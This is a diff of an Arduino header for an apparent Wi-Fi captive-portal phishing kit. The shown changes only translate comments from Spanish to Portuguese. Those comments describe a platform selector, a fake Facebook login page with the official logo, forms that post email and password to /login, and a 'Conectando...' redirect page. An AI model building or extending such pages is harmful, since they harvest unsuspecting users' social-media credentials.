@@ -4,12 +4,12 @@
 #include <Arduino.h>
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  HTMLs DEL PORTAL CAUTIVO
-//  Todos los formularios usan POST a /login con campos email/password
-//  Después de submit, /success muestra "Conectando..." y luego redirige
+//  HTMLs DO PORTAL CATIVO
+//  Todos os formulários usam POST para /login com os campos email/password
+//  Depois do submit, /success mostra "Conectando..." e depois redireciona
 // ═══════════════════════════════════════════════════════════════════════════
 
-// ───── Selector de plataforma (página inicial) ────────────────────────────
+// ───── Seletor de plataforma (página inicial) ────────────────────────────
 const char html_selector[] PROGMEM = R"rawliteral(<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -81,7 +81,7 @@ h1 { font-size: 22px; color: #1a1a1a; margin-bottom: 8px; }
 </body>
 </html>)rawliteral";
 
-// ───── Página de éxito (después del POST /login) ──────────────────────────
+// ───── Página de sucesso (depois do POST /login) ──────────────────────────
 const char html_success[] PROGMEM = R"rawliteral(<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -120,7 +120,7 @@ setTimeout(function() {
 </html>)rawliteral";
 
 // ───── Facebook (mejorado, responsive) ────────────────────────────────────
-// ───── Facebook (mejorado, responsive, con logo oficial) ──────────────────
+// ───── Facebook (melhorado, responsivo, com logo oficial) ──────────────────
 const char html_facebook[] PROGMEM = R"rawliteral(<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
